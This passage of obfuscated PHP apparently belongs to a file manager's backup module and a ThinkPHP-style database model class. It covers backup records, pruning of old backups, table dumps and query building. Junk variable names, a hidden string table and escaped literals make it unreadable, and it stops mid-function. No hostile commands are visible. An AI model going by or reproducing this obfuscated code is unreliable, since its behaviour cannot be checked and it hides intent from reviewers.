$–©—Æ•[11] . date($–©—Æ•[760]); } $èÕ—µ¥á = array($–©—Æ•[758] => $…ŠÁ­Òª[$–©—Æ•[758]], $–©—Æ•[32] => self::$name, $–©—Æ•[756] => 0, $–©—Æ•[761] => $…ŠÁ­Òª[$–©—Æ•[761]], $–©—Æ•[762] => self::$manual, $–©—Æ•[293] => array($–©—Æ•[763] => array($–©—Æ•[756] => 0), $–©—Æ•[764] => array($–©—Æ•[756] => 0, $–©—Æ•[765] => 0, $–©—Æ•[766] => 0, $–©—Æ•[33] => $–©—Æ•[12], $–©—Æ•[767] => 0, $–©—Æ•[506] => 0), $–©—Æ•[768] => array($–©—Æ•[756] => 0, $–©—Æ•[765] => 0, $–©—Æ•[766] => 0, $–©—Æ•[767] => 0, $–©—Æ•[506] => 0), $–©—Æ•[199] => array($–©—Æ•[756] => 0, $–©—Æ•[769] => 0, $–©—Æ•[770] => 0, $–©—Æ•[771] => 0, $–©—Æ•[772] => 0, $–©—Æ•[477] => $®‘“‰©û, $–©—Æ•[767] => 0, $–©—Æ•[506] => 0)), $–©—Æ•[767] => time(), $–©—Æ•[506] => 0); $Ù‡Ì‰¢” = Model($–©—Æ•[755])->insert($èÕ—µ¥á); $èÕ—µ¥á[$–©—Æ•[408]] = $Ù‡Ì‰¢”; return $èÕ—µ¥á; } private function checkStore($©»êŞ¼ã) { $ĞŞ‡ØÖ– =& $_SERVER[Ü©»’·]; $üæĞ‹µ° = Model($ĞŞ‡ØÖ–[773])->listData($©»êŞ¼ã); Model($ĞŞ‡ØÖ–[773])->checkConfig($üæĞ‹µ°); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ü©»’·][755])->findByName(self::$name); } return self::$option; } public static function set($ú»‹â”Ê) { $şàØ”¾û =& $_SERVER[Ü©»’·]; $œ˜Ş£ó° = self::get(); foreach ($ú»‹â”Ê as $ï—…¼‰ => $÷í¬÷À¼) { $ñ·Ñê¶ = explode($şàØ”¾û[10], $ï—…¼‰); $íÜ¦ˆ—í = count($ñ·Ñê¶); switch ($íÜ¦ˆ—í) { case 1: $œ˜Ş£ó°[$ñ·Ñê¶[0]] = $÷í¬÷À¼; break; case 2: $œ˜Ş£ó°[$ñ·Ñê¶[0]][$ñ·Ñê¶[1]] = $÷í¬÷À¼; break; case 3: $œ˜Ş£ó°[$ñ·Ñê¶[0]][$ñ·Ñê¶[1]][$ñ·Ñê¶[2]] = $÷í¬÷À¼; break; } } Model($şàØ”¾û[755])->update($œ˜Ş£ó°[$şàØ”¾û[408]], $œ˜Ş£ó°); self::$option = $œ˜Ş£ó°; return self::$option; } public function keep() { $ßäãûÕ¶ =& $_SERVER[Ü©»’·]; $Áóœ±´Ê = self::get(); if ($Áóœ±´Ê[$ßäãûÕ¶[293]][$ßäãûÕ¶[763]][$ßäãûÕ¶[756]] == $ßäãûÕ¶[88]) { return; } $this->backupKeep($Áóœ±´Ê); self::set(array($ßäãûÕ¶[774] => 1)); } private function backupKeep($„ÓÅÎÃ) { $´¦Õ”ÀÛ =& $_SERVER[Ü©»’·]; if (self::$manual == 1) { return; } $ë±öˆâò = Model($´¦Õ”ÀÛ[755])->listData(); if (empty($ë±öˆâò)) { return; } $üĞö‚¯ı = 0; $÷©œ›è = array(); foreach ($ë±öˆâò as $Ò§½ã‡À) { if ($üĞö‚¯ı >= 7) { break; } $÷©œ›è[] = $Ò§½ã‡À[$´¦Õ”ÀÛ[32]]; $üĞö‚¯ı++; } for ($üĞö‚¯ı = 0; $üĞö‚¯ı < 12; $üĞö‚¯ı++) { $÷©œ›è[] = date($´¦Õ”ÀÛ[775], strtotime("\55{$üĞö‚¯ı}\40\155\157\156\164\x68\163")); } $÷©œ›è = array_unique($÷©œ›è); $òÅĞªº = Model($´¦Õ”ÀÛ[776])->get($´¦Õ”ÀÛ[777]); foreach ($ë±öˆâò as $Ò§½ã‡À) { if (isset($Ò§½ã‡À[$´¦Õ”ÀÛ[762]]) && $Ò§½ã‡À[$´¦Õ”ÀÛ[762]] == $´¦Õ”ÀÛ[88]) { continue; } if (!empty($Ò§½ã‡À[$´¦Õ”ÀÛ[32]]) && in_array($Ò§½ã‡À[$´¦Õ”ÀÛ[32]], $÷©œ›è)) { continue; } Model($´¦Õ”ÀÛ[755])->remove($Ò§½ã‡À[$´¦Õ”ÀÛ[408]]); $»¤¦‚ = $this->backupPath($„ÓÅÎÃ, $òÅĞªº); IO::remove($»¤¦‚, !1); } } private function backupPath($Š¹„ƒÕ§, $·Ü¿•Ğƒ = false) { $ùªÂúÆ… =& $_SERVER[Ü©»’·]; if (!$·Ü¿•Ğƒ) { $·Ü¿•Ğƒ = Model($ùªÂúÆ…[776])->get($ùªÂúÆ…[777]); } $ÏŸ¹‹œ = $Š¹„ƒÕ§[$ùªÂúÆ…[32]]; $õÊœˆËã = substr(md5($ùªÂúÆ…[778] . $·Ü¿•Ğƒ . $ÏŸ¹‹œ), 0, 8); return "\x7b\x69\x6f\x3a{$Š¹„ƒÕ§[$ùªÂúÆ…[758]]}\175\57\144\141\x74\141\142\141\x73\145\57\142\141\x63\153\165\x70\x2f" . $ÏŸ¹‹œ . $ùªÂúÆ…[11] . $õÊœˆËã; } public function db() { $àª¾íÄÖ =& $_SERVER[Ü©»’·]; $¶¥…ŒÏ² = self::get(); if ($¶¥…ŒÏ²[$àª¾íÄÖ[293]][$àª¾íÄÖ[764]][$àª¾íÄÖ[756]] == $àª¾íÄÖ[88]) { return !0; } $”ç¢ë¡ß = new BackupDb(); if (!$”ç¢ë¡ß->index()) { return !1; } self::set(array($àª¾íÄÖ[779] => 1)); return !0; } public function dbFile() { $§ù†íŒæ =& $_SERVER[Ü©»’·]; $ôš´›‚ = self::get(); if ($ôš´›‚[$§ù†íŒæ[293]][$§ù†íŒæ[768]][$§ù†íŒæ[756]] == $§ù†íŒæ[88]) { return !0; } $”€Ã‘æ = new BackupDbFile(); if (!$”€Ã‘æ->index()) { return !1; } self::set(array($§ù†íŒæ[780] => 1)); return !0; } public function file() { $áƒûšó“ =& $_SERVER[Ü©»’·]; $ª§ä•Èİ = self::get(); if ($ª§ä•Èİ[$áƒûšó“[293]][$áƒûšó“[199]][$áƒûšó“[756]] == $áƒûšó“[88]) { return !0; } if (!isset($ª§ä•Èİ[$áƒûšó“[761]]) || $ª§ä•Èİ[$áƒûšó“[761]] == $áƒûšó“[197]) { $ÇÖƒÚ˜½ = new BackupFile(); if (!$ÇÖƒÚ˜½->index()) { return !1; } } self::set(array($áƒûšó“[781] => 1, $áƒûšó“[756] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ø’ŒÇô€ =& $_SERVER[Ü©»’·]; $»–‡’£Ô = Backup::get(); self::$io = $»–‡’£Ô[$ø’ŒÇô€[758]]; self::$name = $»–‡’£Ô[$ø’ŒÇô€[32]]; $œ‹†µ = new DbManage(); $»üö¯ÊÏ = $œ‹†µ->dbType(); $ã‚÷ìœì = array($ø’ŒÇô€[782] => $»üö¯ÊÏ, $ø’ŒÇô€[783] => time()); Backup::set($ã‚÷ìœì); $¿ÏÙ¿í = $this->tmpFilesPath() . $ø’ŒÇô€[784] . self::$name . $ø’ŒÇô€[8]; del_dir($¿ÏÙ¿í); mk_dir($¿ÏÙ¿í); $‚­„Ùãİ = $è¿Ñ‘¸ = 0; $»³ØõøÙ = new Task($ø’ŒÇô€[785], $ø’ŒÇô€[786], 0, LNG($ø’ŒÇô€[787]) . $ø’ŒÇô€[788] . LNG($ø’ŒÇô€[789])); try { $‡ê’Ñ™ = $œ‹†µ->db()->getTables(); } catch (Exception $³ùö€ù´) { $»³ØõøÙ->end(); return !1; } $‡ê’Ñ™ = array_diff($‡ê’Ñ™, array($ø’ŒÇô€[790], $ø’ŒÇô€[791])); foreach ($‡ê’Ñ™ as $¢Ä”õÔ) { $‚­„Ùãİ += $œ‹†µ->model($¢Ä”õÔ)->count(); } $»³ØõøÙ->task[$ø’ŒÇô€[792]] = $‚­„Ùãİ; $GLOBALS[$ø’ŒÇô€[793]] = self::$name; foreach ($‡ê’Ñ™ as $¢Ä”õÔ) { $¸åÔñ¹ı = $¿ÏÙ¿í . $¢Ä”õÔ . $ø’ŒÇô€[794]; $ÍÇ‚±Éû = null; if ($¢Ä”õÔ == $ø’ŒÇô€[795] && (!isset($»–‡’£Ô[$ø’ŒÇô€[761]]) || $»–‡’£Ô[$ø’ŒÇô€[761]] == $ø’ŒÇô€[197])) { $ÍÇ‚±Éû = self::$io; } $è¿Ñ‘¸ += $œ‹†µ->sqlFromDb($¢Ä”õÔ, $¸åÔñ¹ı, $»³ØõøÙ, $ÍÇ‚±Éû); } unset($GLOBALS[$ø’ŒÇô€[793]]); $»³ØõøÙ->end(); if ($è¿Ñ‘¸ > $‚­„Ùãİ) { $‚­„Ùãİ = $è¿Ñ‘¸; } $ã‚÷ìœì = array($ø’ŒÇô€[782] => $»üö¯ÊÏ, $ø’ŒÇô€[779] => 1, $ø’ŒÇô€[796] => $‚­„Ùãİ, $ø’ŒÇô€[797] => $è¿Ñ‘¸, $ø’ŒÇô€[798] => time()); Backup::set($ã‚÷ìœì); if ($‚­„Ùãİ - $è¿Ñ‘¸ > 0) { $¯ƒÀ³¸¡ = $ø’ŒÇô€[799]; if (stristr(I18n::getType(), $ø’ŒÇô€[800])) { $¯ƒÀ³¸¡ = $ø’ŒÇô€[801]; } write_log(array($¯ƒÀ³¸¡, $ã‚÷ìœì), $ø’ŒÇô€[786]); return !1; } return !0; } private function tmpFilesPath() { $£ Á·ºÄ =& $_SERVER[Ü©»’·]; $Ô–¸ÊÄ = TEMP_FILES; if ($GLOBALS[$£ Á·ºÄ[6]][$£ Á·ºÄ[89]][$£ Á·ºÄ[802]]) { $Ô–¸ÊÄ = $GLOBALS[$£ Á·ºÄ[6]][$£ Á·ºÄ[89]][$£ Á·ºÄ[802]]; if (!mk_dir($Ô–¸ÊÄ) || !is_writable($Ô–¸ÊÄ) || !IO::mkfile($Ô–¸ÊÄ . $£ Á·ºÄ[803])) { $Ô–¸ÊÄ = TEMP_FILES; } } return $Ô–¸ÊÄ; } } goto AçŠÊ¾¡œ; bóÅİÓğÎø: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\145", "\x6f\162\x64\x65\162", "\x61\154\x69\141\163", "\x68\141\166\151\x6e\x67", "\147\162\157\x75\x70", "\x6c\157\143\x6b", "\144\x69\163\164\151\156\143\x74", "\141\165\164\157", "\x66\151\154\x74\145\162", "\x76\141\154\x69\144\141\164\x65", "\162\145\163\165\154\164", "\x62\151\156\144", "\164\x6f\x6b\x65\156"); public function __construct($Å¹±²Ü = '', $¿ëªŠĞì = '', $ÇÏ»şğ¨ = '') { $éñØ»èŒ =& $_SERVER[Ü©»’·]; $this->_initialize(); if (!empty($Å¹±²Ü)) { if (strpos($Å¹±²Ü, $éñØ»èŒ[10])) { list($this->dbName, $this->name) = explode($éñØ»èŒ[10], $Å¹±²Ü); } else { $this->name = $Å¹±²Ü; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¿ëªŠĞì)) { $this->tablePrefix = $éñØ»èŒ[12]; } elseif ($éñØ»èŒ[12] != $¿ëªŠĞì) { $this->tablePrefix = $¿ëªŠĞì; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($éñØ»èŒ[244]); } $this->db(0, empty($this->connection) ? $ÇÏ»şğ¨ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¢ùëÒí =& $_SERVER[Ü©»’·]; if (empty($this->fields)) { if (think_config($¢ùëÒí[245])) { $Öğ àêË = $this->dbName ? $this->dbName : think_config($¢ùëÒí[246]); $ŒÊ…çªÓ = think_var_cache($¢ùëÒí[247] . strtolower(get_path_this($Öğ àêË) . $¢ùëÒí[10] . $this->name)); if ($ŒÊ…çªÓ) { $¬¯Ò¼œ­ = think_config($¢ùëÒí[248]); if (empty($¬¯Ò¼œ­) || $ŒÊ…çªÓ[$¢ùëÒí[249]] == $¬¯Ò¼œ­) { $this->fields = $ŒÊ…çªÓ; return; } } } $this->flush(); } } public function flush() { $ÛèÅæ =& $_SERVER[Ü©»’·]; $this->db->setModel($this->name); $¢×’ˆ—ü = $this->db->getFields($this->getTableName()); if (!$¢×’ˆ—ü) { return !1; } $this->fields = array_keys($¢×’ˆ—ü); $this->fields[$ÛèÅæ[250]] = !1; foreach ($¢×’ˆ—ü as $Óƒ’Ú›Ğ => $»Ş•›ğû) { $Ä…¼û‹ˆ[$Óƒ’Ú›Ğ] = $»Ş•›ğû[$ÛèÅæ[33]]; if ($»Ş•›ğû[$ÛèÅæ[39]]) { $this->fields[$ÛèÅæ[251]] = $Óƒ’Ú›Ğ; if ($»Ş•›ğû[$ÛèÅæ[42]]) { $this->fields[$ÛèÅæ[250]] = !0; } } } $this->fields[$ÛèÅæ[252]] = $Ä…¼û‹ˆ; if (think_config($ÛèÅæ[248])) { $this->fields[$ÛèÅæ[249]] = think_config($ÛèÅæ[248]); } if (think_config($ÛèÅæ[245])) { $±…‰Ãıœ = $this->dbName ? $this->dbName : think_config($ÛèÅæ[246]); think_var_cache($ÛèÅæ[247] . strtolower(get_path_this($±…‰Ãıœ) . $ÛèÅæ[10] . $this->name), $this->fields); } } public function switchModel($È½òÓôï, $ò§ı„›º = array()) { $Áã·Î”Ü =& $_SERVER[Ü©»’·]; $ÒŒçá‰ = ucwords(strtolower($È½òÓôï)) . $Áã·Î”Ü[253]; if (!class_exists($ÒŒçá‰)) { think_exception($ÒŒçá‰ . think_lang($Áã·Î”Ü[254])); } $this->_extModel = new $ÒŒçá‰($this->name); if (!empty($ò§ı„›º)) { foreach ($ò§ı„›º as $Şö»ñ») { $this->_extModel->setProperty($Şö»ñ», $this->{$Şö»ñ»}); } } return $this->_extModel; } public function __set($ÙıöŸïè, $‡ü½îµ”) { $this->data[$ÙıöŸïè] = $‡ü½îµ”; } public function __get($°‹®¤Ş–) { return isset($this->data[$°‹®¤Ş–]) ? $this->data[$°‹®¤Ş–] : null; } public function __isset($ŞÕ¨†„) { return isset($this->data[$ŞÕ¨†„]); } public function __unset($³Ï£ÄŸ) { unset($this->data[$³Ï£ÄŸ]); } public function __call($Èº…×˜, $óâ›ş¦¦) { $Ú˜ùæï =& $_SERVER[Ü©»’·]; if (in_array(strtolower($Èº…×˜), $this->methods, !0)) { $this->options[strtolower($Èº…×˜)] = $óâ›ş¦¦[0]; return $this; } elseif (in_array(strtolower($Èº…×˜), array($Ú˜ùæï[255], $Ú˜ùæï[256], $Ú˜ùæï[257], $Ú˜ùæï[258], $Ú˜ùæï[259]), !0)) { $›şÚ– = isset($óâ›ş¦¦[0]) ? $óâ›ş¦¦[0] : $Ú˜ùæï[188]; $›şÚ– = $this->db->parseKey($›şÚ–); return $this->getField(strtoupper($Èº…×˜) . $Ú˜ùæï[260] . $›şÚ– . $Ú˜ùæï[261] . $Èº…×˜, $Ú˜ùæï[255]); } elseif (strtolower(substr($Èº…×˜, 0, 5)) == $Ú˜ùæï[262]) { $›şÚ– = think_parse_name(substr($Èº…×˜, 5)); $ë¼¥«¦[$›şÚ–] = $óâ›ş¦¦[0]; return $this->where($ë¼¥«¦)->find(); } elseif (strtolower(substr($Èº…×˜, 0, 10)) == $Ú˜ùæï[263]) { $“¢ŸŠµ = think_parse_name(substr($Èº…×˜, 10)); $ë¼¥«¦[$“¢ŸŠµ] = $óâ›ş¦¦[0]; return $this->where($ë¼¥«¦)->getField($óâ›ş¦¦[1]); } elseif (isset($this->_scope[$Èº…×˜])) { return $this->scope($Èº…×˜, $óâ›ş¦¦[0]); } elseif (method_exists($this, $Èº…×˜)) { array_unshift($óâ›ş¦¦, $Èº…×˜); return call_user_func_array(array($this, $Ú˜ùæï[264]), $óâ›ş¦¦); } else { return call_user_func_array(array(parent, $Èº…×˜), $óâ›ş¦¦); } } protected function call() { $“ê•¦¢™ =& $_SERVER[Ü©»’·]; $‰èõÇœ× = func_get_args(); $õ…½ìŞŞ = array_shift($‰èõÇœ×); $ÈˆÀïæï = $õ…½ìŞŞ; if (is_array($õ…½ìŞŞ)) { $ÈˆÀïæï = $õ…½ìŞŞ[1]; $õ…½ìŞŞ = $õ…½ìŞŞ[0]; } $´÷ƒ–¾© = count($‰èõÇœ×) - 1; if (isset($‰èõÇœ×[$´÷ƒ–¾©]) && $‰èõÇœ×[$´÷ƒ–¾©] === $õ…½ìŞŞ) { think_exception(__CLASS__ . $“ê•¦¢™[4] . $õ…½ìŞŞ . think_lang($“ê•¦¢™[265])); return; } $‰èõÇœ×[] = $õ…½ìŞŞ; if (method_exists($this, $“ê•¦¢™[266])) { $ì³ıã·– = call_user_func_array(array($this, $“ê•¦¢™[267]), array($ÈˆÀïæï, $‰èõÇœ×)); if (!is_null($ì³ıã·–) && $ì³ıã·– !== !1) { return $ì³ıã·–; } } $Äñæãíü = call_user_func_array(array($this, $õ…½ìŞŞ), $‰èõÇœ×); if (method_exists($this, $“ê•¦¢™[268])) { $ì³ıã·– = call_user_func_array(array($this, $“ê•¦¢™[269]), array($ÈˆÀïæï, $‰èõÇœ×, $Äñæãíü)); if ($ì³ıã·–) { return $ì³ıã·–; } } return $Äñæãíü; } protected function _initialize() { } protected function _facade($çŸéØ»€) { $Èå‡÷ı« =& $_SERVER[Ü©»’·]; if (!empty($this->fields)) { foreach ($çŸéØ»€ as $‚Œô‡ñï => $‚“Ì·â¯) { if (is_array($this->fields) && !in_array($‚Œô‡ñï, $this->fields, !0)) { unset($çŸéØ»€[$‚Œô‡ñï]); } elseif (is_scalar($‚“Ì·â¯)) { $this->_parseType($çŸéØ»€, $‚Œô‡ñï); } } } if (!empty($this->options[$Èå‡÷ı«[270]])) { $çŸéØ»€ = array_map($this->options[$Èå‡÷ı«[270]], $çŸéØ»€); unset($this->options[$Èå‡÷ı«[270]]); } $this->_beforeWrite($çŸéØ»€); return $çŸéØ»€; } protected function _beforeWrite(&$šÛÚ °) { } public function add($ß‹Šú™‰ = '', $ÒÑ£ä· = array(), $¸ıñ§­ = false) { if (empty($ß‹Šú™‰)) { if (!empty($this->data)) { $ß‹Šú™‰ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ü©»’·][271]); return !1; } } $ÒÑ£ä· = $this->_parseOptions($ÒÑ£ä·); $ß‹Šú™‰ = $this->_facade($ß‹Šú™‰); if (!1 === $this->_beforeInsert($ß‹Šú™‰, $ÒÑ£ä·)) { return !1; } $¢¤ò›Ó = $this->db->insert($ß‹Šú™‰, $ÒÑ£ä·, $¸ıñ§­); if (!1 !== $¢¤ò›Ó) { $êïşëÏ‡ = $this->getLastInsID(); if ($êïşëÏ‡) { $ß‹Šú™‰[$this->getPk()] = $êïşëÏ‡; $this->_after_insert($ß‹Šú™‰, $ÒÑ£ä·); return $êïşëÏ‡; } $this->_after_insert($ß‹Šú™‰, $ÒÑ£ä·); } return $¢¤ò›Ó; } protected function _beforeInsert(&$éş¾ßÜ, $øèÎäÄÍ) { } protected function _after_insert($ò¥Á‰ºï, $ıá—ıóÈ) { } public function addAll($–öÕ¯”æ, $ô“áğ“ö = array(), $°ÊÙ„¬ = false) { $Øğ£êïû =& $_SERVER[Ü©»’·]; if (empty($–öÕ¯”æ)) { $this->error = think_lang($Øğ£êïû[271]); return !1; } $ô“áğ“ö = $this->_parseOptions($ô“áğ“ö); foreach ($–öÕ¯”æ as $Ÿó—öä => $‚äíùù) { $–öÕ¯”æ[$Ÿó—öä] = $this->_facade($‚äíùù); } if (method_exists($this->db, $Øğ£êïû[272])) { $ÕÂß“ìÍ = $this->db->insertAll($–öÕ¯”æ, $ô“áğ“ö, $°ÊÙ„¬); } else { $this->startTrans(); foreach ($–öÕ¯”æ as $Ÿó—öä => $‚äíùù) { $ÕÂß“ìÍ = $this->db->insert($‚äíùù, $ô“áğ“ö, $°ÊÙ„¬); } $this->commit(); } if (!1 !== $ÕÂß“ìÍ) { $«Ú•Ä¼• = $this->getLastInsID(); if ($«Ú•Ä¼•) { return $«Ú•Ä¼•; } } return $ÕÂß“ìÍ; } public function selectAdd($š™¬Í¢Ö = '', $ÉšÍµĞ» = '', $–‡ôÔë– = array()) { $÷üÄ“½˜ =& $_SERVER[Ü©»’·]; $–‡ôÔë– = $this->_parseOptions($–‡ôÔë–); if (!1 === ($–Â÷üÌ = $this->db->selectInsert($š™¬Í¢Ö ? $š™¬Í¢Ö : $–‡ôÔë–[$÷üÄ“½˜[273]], $ÉšÍµĞ» ? $ÉšÍµĞ» : $this->getTableName(), $–‡ôÔë–))) { $this->error = think_lang($÷üÄ“½˜[274]); return !1; } else { return $–Â÷üÌ; } } public function save($õö•³Å– = '', $³®›²ß‹ = array()) { $Ğ¼€î· =& $_SERVER[Ü©»’·]; if (empty($õö•³Å–)) { if (!empty($this->data)) { $õö•³Å– = $this->data; $this->data = array(); } else { $this->error = think_lang($Ğ¼€î·[271]); return !1; } } $õö•³Å– = $this->_facade($õö•³Å–); $³®›²ß‹ = $this->_parseOptions($³®›²ß‹); $ÍÁñî¦· = $this->getPk(); if (!isset($³®›²ß‹[$Ğ¼€î·[275]])) { if (isset($õö•³Å–[$ÍÁñî¦·])) { $¿æóóş[$ÍÁñî¦·] = $õö•³Å–[$ÍÁñî¦·]; $³®›²ß‹[$Ğ¼€î·[275]] = $¿æóóş; unset($õö•³Å–[$ÍÁñî¦·]); } else { $this->error = think_lang($Ğ¼€î·[274]); return !1; } } if (is_array($³®›²ß‹[$Ğ¼€î·[275]]) && isset($³®›²ß‹[$Ğ¼€î·[275]][$ÍÁñî¦·])) { $šÛã¶±ì = $³®›²ß‹[$Ğ¼€î·[275]][$ÍÁñî¦·]; } if (!1 === $this->_beforeUpdate($õö•³Å–, $³®›²ß‹)) { return !1; } $½à¦Úüà = $this->db->update($õö•³Å–, $³®›²ß‹); if (!1 !== $½à¦Úüà) { if (isset($šÛã¶±ì)) { $õö•³Å–[$ÍÁñî¦·] = $šÛã¶±ì; } $this->_afterUpdate($õö•³Å–, $³®›²ß‹); } return $½à¦Úüà; } protected function _beforeUpdate(&$Ëü³²à, $çéíøå¶) { } protected function _afterUpdate($ÏÌİıÄ, $ÉæÇÒ) { } public function delete($ŠúãÒ¥¸ = array()) { $Ø¦‘ğ¸Ñ =& $_SERVER[Ü©»’·]; if (empty($ŠúãÒ¥¸) && empty($this->options[$Ø¦‘ğ¸Ñ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $½Êûãæµ = $this->getPk(); if (is_numeric($ŠúãÒ¥¸) || is_string($ŠúãÒ¥¸)) { if (strpos($ŠúãÒ¥¸, $Ø¦‘ğ¸Ñ[50])) { $×†ÚıñÀ[$½Êûãæµ] = array($Ø¦‘ğ¸Ñ[276], $ŠúãÒ¥¸); } else { $×†ÚıñÀ[$½Êûãæµ] = $ŠúãÒ¥¸; } $this->options[$Ø¦‘ğ¸Ñ[275]] = $×†ÚıñÀ; } $ŠúãÒ¥¸ = $this->_parseOptions(); if (is_array($ŠúãÒ¥¸[$Ø¦‘ğ¸Ñ[275]]) && isset($ŠúãÒ¥¸[$Ø¦‘ğ¸Ñ[275]][$½Êûãæµ])) { $²–é¶à˜ = $ŠúãÒ¥¸[$Ø¦‘ğ¸Ñ[275]][$½Êûãæµ]; } $¸ª°¸¹ = $this->db->delete($ŠúãÒ¥¸); if (!1 !== $¸ª°¸¹) { $èıŞø¸Ô = array(); if (isset($²–é¶à˜)) { $èıŞø¸Ô[$½Êûãæµ] = $²–é¶à˜; } $this->_after_delete($èıŞø¸Ô, $ŠúãÒ¥¸); } return $¸ª°¸¹; } protected function _after_delete($Á˜ôÀü, $â¼ŠÂõ“) { } public function select($·±ØæÀ = array()) { $¢ŞÄ¥î =& $_SERVER[Ü©»’·]; if (is_string($·±ØæÀ) || is_numeric($·±ØæÀ)) { $ƒ‡È¤ää = $this->getPk(); if (strpos($·±ØæÀ, $¢ŞÄ¥î[50])) { $© ØõîÔ[$ƒ‡È¤ää] = array($¢ŞÄ¥î[276], $·±ØæÀ); } else { $© ØõîÔ[$ƒ‡È¤ää] = $·±ØæÀ; } $this->options[$¢ŞÄ¥î[275]] = $© ØõîÔ; } elseif (!1 === $·±ØæÀ) { $·±ØæÀ = $this->_parseOptions(); return $¢ŞÄ¥î[277] . $this->db->buildSelectSql($·±ØæÀ) . $¢ŞÄ¥î[278]; } $·±ØæÀ = $this->_parseOptions(); $ç²‹ÏÅ¥ = $this->db->select($·±ØæÀ); if (!1 === $ç²‹ÏÅ¥) { return !1; } if (empty($ç²‹ÏÅ¥)) { return null; } $this->_afterSelect($ç²‹ÏÅ¥, $·±ØæÀ); return $ç²‹ÏÅ¥; } protected function _afterSelect(&$ëÙøŠ¾­, $Ù³÷óã¹) { } public function buildSql($ÈÌ¨Âõ‹ = array()) { $ƒ’³àú® =& $_SERVER[Ü©»’·]; $ÈÌ¨Âõ‹ = $this->_parseOptions($ÈÌ¨Âõ‹); return $ƒ’³àú®[277] . $this->db->buildSelectSql($ÈÌ¨Âõ‹) . $ƒ’³àú®[278]; } public function optionsValue($¢Öá‡½ü = null) { if (is_null($¢Öá‡½ü)) { return $this->options; } elseif (is_array($¢Öá‡½ü)) { $this->options = array_merge($this->options, $¢Öá‡½ü); } } protected function _parseOptions($Ñ·ÔÜßı = array()) { $ØÖ“úÓ„ =& $_SERVER[Ü©»’·]; if (is_array($Ñ·ÔÜßı)) { $Ñ·ÔÜßı = array_merge($this->options, $Ñ·ÔÜßı); } $this->options = array(); if (!isset($Ñ·ÔÜßı[$ØÖ“úÓ„[279]])) { $Ñ·ÔÜßı[$ØÖ“úÓ„[279]] = $this->getTableName(); $ù¸ä¾®‡ = $this->fields; } else { $ù¸ä¾®‡ = $this->getDbFields(); } if (!empty($Ñ·ÔÜßı[$ØÖ“úÓ„[280]])) { $Ñ·ÔÜßı[$ØÖ“úÓ„[279]] .= $ØÖ“úÓ„[53] . $Ñ·ÔÜßı[$ØÖ“úÓ„[280]]; } $Ñ·ÔÜßı[$ØÖ“úÓ„[281]] = $this->name; if (isset($Ñ·ÔÜßı[$ØÖ“úÓ„[275]]) && is_array($Ñ·ÔÜßı[$ØÖ“úÓ„[275]]) && !empty($ù¸ä¾®‡) && !isset($Ñ·ÔÜßı[$ØÖ“úÓ„[282]]) && !isset($Ñ·ÔÜßı[$ØÖ“úÓ„[279]])) { foreach ($Ñ·ÔÜßı[$ØÖ“úÓ„[275]] as $ôÙô‹î => $­èÕ¼ë) { $ôÙô‹î = trim($ôÙô‹î); if (in_array($ôÙô‹î, $ù¸ä¾®‡, !0)) { if (is_scalar($­èÕ¼ë)) { $this->_parseType($Ñ·ÔÜßı[$ØÖ“úÓ„[275]], $ôÙô‹î); } } elseif (!is_numeric($ôÙô‹î) && $ØÖ“úÓ„[11] != substr($ôÙô‹î, 0, 1) && !1 === strpos($ôÙô‹î, $ØÖ“úÓ„[10]) && !1 === strpos($ôÙô‹î, $ØÖ“úÓ„[260]) && !1 === strpos($ôÙô‹î, $ØÖ“úÓ„[283]) && !1 === strpos($ôÙô‹î, $ØÖ“úÓ„[284])) { unset($Ñ·ÔÜßı[$ØÖ“úÓ„[275]][$ôÙô‹î]); } } } $this->_options_filter($Ñ·ÔÜßı); return $Ñ·ÔÜßı; } protected function _options_filter(&$Ìˆáíáœ) { } protected function _parseType(&$’ıÄÚÖƒ, $ëâÚå¾“) { $ûËßëï± =& $_SERVER[Ü©»’·]; if (empty($this->options[$ûËßëï±[285]][$ûËßëï±[4] . $ëâÚå¾“])) { $°¬ªØèÀ = strtolower($this->fields[$ûËßëï±[252]][$ëâÚå¾“]); if (!1 !== strpos($°¬ªØèÀ, $ûËßëï±[286])) { } elseif (!1 === strpos($°¬ªØèÀ, $ûËßëï±[287]) && !1 !== strpos($°¬ªØèÀ, $ûËßëï±[288])) { $’ıÄÚÖƒ[$ëâÚå¾“] = intval($’ıÄÚÖƒ[$ëâÚå¾“]); } elseif (!1 !== strpos($°¬ªØèÀ, $ûËßëï±[289]) || !1 !== strpos($°¬ªØèÀ, $ûËßëï±[290])) { $’ıÄÚÖƒ[$ëâÚå¾“] = floatval($’ıÄÚÖƒ[$ëâÚå¾“]); } elseif (!1 !== strpos($°¬ªØèÀ, $ûËßëï±[291])) { $’ıÄÚÖƒ[$ëâÚå¾“] = (bool) $’ıÄÚÖƒ[$ëâÚå¾“]; } } } public function find($òÈ¿ìŞ = array()) { $ˆ†’Æ» =& $_SERVER[Ü©»’·]; if (is_numeric($òÈ¿ìŞ) || is_string($òÈ¿ìŞ)) { $¤ô˜õÈ[$this->getPk()] = intval($òÈ¿ìŞ); $this->options[$ˆ†’Æ»[275]] = $¤ô˜õÈ; } $this->options[$ˆ†’Æ»[292]] = 1; $òÈ¿ìŞ = $this->_parseOptions(); $ûœßëÄá = $this->db->select($òÈ¿ìŞ); if (!1 === $ûœßëÄá) { return !1; } if (empty($ûœßëÄá)) { return null; } $this->data = $ûœßëÄá[0]; $this->_afterFind($this->data, $òÈ¿ìŞ); if (!empty($this->options[$ˆ†’Æ»[293]])) { return $this->returnResult($this->data, $this->options[$ˆ†’Æ»[293]]); } return $this->data; } protected function _afterFind(&$â¹©ŠÉ², $‘‡‰Óìã) { } protected function returnResult($ÌÈ½Ëƒ’, 